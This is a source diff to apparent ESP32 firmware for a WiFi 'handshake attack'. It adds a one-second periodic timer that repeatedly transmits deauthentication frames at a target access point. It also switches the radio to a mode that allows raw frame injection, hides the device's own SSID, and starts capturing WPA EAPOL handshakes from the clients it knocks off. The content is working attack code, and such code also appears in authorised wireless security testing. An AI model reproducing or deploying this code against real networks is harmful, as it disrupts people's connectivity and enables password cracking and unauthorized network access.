@@ -41,6 +41,7 @@ extern void sd_cache_add_handshake_name(const char *name);
 static const char *TAG = "attack_handshake";
 static attack_handshake_methods_t method = -1;
 static wifi_ap_record_t current_ap_record;
+static esp_timer_handle_t deauth_timer_handle = NULL;
 static bool attack_running = false;
 
 /**
@@ -123,7 +124,7 @@ static void send_deauth_frame() {
                 if (j + 1 < sizeof(deauth_frame)) *p++ = ' ';
             }
             *p = '\0';
-            ESP_LOGI(TAG, "[HANDSHAKE] DEAUTH RAW: %s", hexbuf);
+            //ESP_LOGI(TAG, "[HANDSHAKE] DEAUTH RAW: %s", hexbuf);
         }
 
         esp_err_t ret = esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame, sizeof(deauth_frame), false);
@@ -133,6 +134,13 @@ static void send_deauth_frame() {
         // Small delay between packets in burst (10ms)
         vTaskDelay(pdMS_TO_TICKS(10));
     }
+}
+
+/**
+ * @brief Timer callback for periodic deauth frame sending
+ */
+static void deauth_timer_callback(void *arg) {
+    send_deauth_frame();
 }
 
 /**
@@ -345,13 +353,35 @@ void attack_handshake_start(const wifi_ap_record_t *ap_record, attack_handshake_
     
     printf("Target Channel: %d\n", ap_record->primary);
     
-    // Verify WiFi mode
+    // Verify and set WiFi mode to APSTA for raw frame transmission
     wifi_mode_t mode;
     esp_wifi_get_mode(&mode);
     const char *mode_str = (mode == WIFI_MODE_STA) ? "STA" : 
                            (mode == WIFI_MODE_AP) ? "AP" : 
                            (mode == WIFI_MODE_APSTA) ? "APSTA" : "UNKNOWN";
     ESP_LOGI(TAG, "Current WiFi mode: %s", mode_str);
+    
+    // Set to APSTA mode if not already (required for deauth frame transmission)
+    if (mode != WIFI_MODE_APSTA) {
+        ESP_LOGI(TAG, "Switching WiFi to APSTA mode for deauth frame transmission");
+        esp_wifi_set_mode(WIFI_MODE_APSTA);
+        vTaskDelay(pdMS_TO_TICKS(100));
+    }
+    
+    // Hide AP SSID to prevent broadcasting unwanted network
+    wifi_config_t ap_config = {
+        .ap = {
+            .ssid = "",
+            .ssid_len = 0,
+            .ssid_hidden = 1,
+            .channel = 1,
+            .password = "",
+            .max_connection = 0,
+            .authmode = WIFI_AUTH_OPEN
+        }
+    };
+    esp_wifi_set_config(WIFI_IF_AP, &ap_config);
+    ESP_LOGI(TAG, "AP SSID hidden (handshake attack mode)");
     
     // Reset counters and flags
     eapol_frame_count = 0;
@@ -374,13 +404,21 @@ void attack_handshake_start(const wifi_ap_record_t *ap_record, attack_handshake_
     esp_wifi_set_channel(ap_record->primary, WIFI_SECOND_CHAN_NONE);
     
     // Give ESP32 time to switch channel (important!)
-    vTaskDelay(pdMS_TO_TICKS(100));
+    vTaskDelay(pdMS_TO_TICKS(200));
     
     // Verify channel was set
     uint8_t current_channel;
     wifi_second_chan_t second_chan;
     esp_wifi_get_channel(&current_channel, &second_chan);
     ESP_LOGI(TAG, "Current channel after set: %d (requested: %d)", current_channel, ap_record->primary);
+    
+    if (current_channel != ap_record->primary) {
+        ESP_LOGW(TAG, "WARNING: Channel not set correctly! Retrying...");
+        esp_wifi_set_channel(ap_record->primary, WIFI_SECOND_CHAN_NONE);
+        vTaskDelay(pdMS_TO_TICKS(200));
+        esp_wifi_get_channel(&current_channel, &second_chan);
+        ESP_LOGI(TAG, "Current channel after retry: %d", current_channel);
+    }
     
     // Initialize sniffer
     sniffer_init();
@@ -394,7 +432,7 @@ void attack_handshake_start(const wifi_ap_record_t *ap_record, attack_handshake_
     
     ESP_LOGI(TAG, "Waiting for BEACON frame from target AP...");
     
-    // Start frame analyzer
+    // Start frame analyzer BEFORE sending deauth so we can capture the handshake
     frame_analyzer_capture_start(SEARCH_HANDSHAKE, ap_record->bssid);
     
     // Register handlers for both EAPOL and MGMT frames
@@ -409,6 +447,16 @@ void attack_handshake_start(const wifi_ap_record_t *ap_record, attack_handshake_
             ESP_LOGD(TAG, "ATTACK_HANDSHAKE_METHOD_BROADCAST");
             // Send first deauth burst immediately
             send_deauth_frame();
+            
+            // Create periodic timer for deauth bursts (every 1 second - Pwnagotchi-style)
+            // Timer runs asynchronously without blocking frame analyzer
+            const esp_timer_create_args_t deauth_timer_args = {
+                .callback = &deauth_timer_callback,
+                .arg = NULL,
+                .name = "deauth_timer"
+            };
+            ESP_ERROR_CHECK(esp_timer_create(&deauth_timer_args, &deauth_timer_handle));
+            ESP_ERROR_CHECK(esp_timer_start_periodic(deauth_timer_handle, 1000000)); // 1 second - aggressive!
             break;
             
         case ATTACK_HANDSHAKE_METHOD_PASSIVE:
@@ -431,10 +479,14 @@ void attack_handshake_stop(){
     
     ESP_LOGI(TAG, "Stopping handshake attack...");
     
-    // Stop attack method (no timer to clean up anymore)
+    // Stop attack method
     switch(method){
         case ATTACK_HANDSHAKE_METHOD_BROADCAST:
-            // No timer cleanup needed
+            if (deauth_timer_handle != NULL) {
+                esp_timer_stop(deauth_timer_handle);
+                esp_timer_delete(deauth_timer_handle);
+                deauth_timer_handle = NULL;
+            }
             break;
             
         case ATTACK_HANDSHAKE_METHOD_PASSIVE:
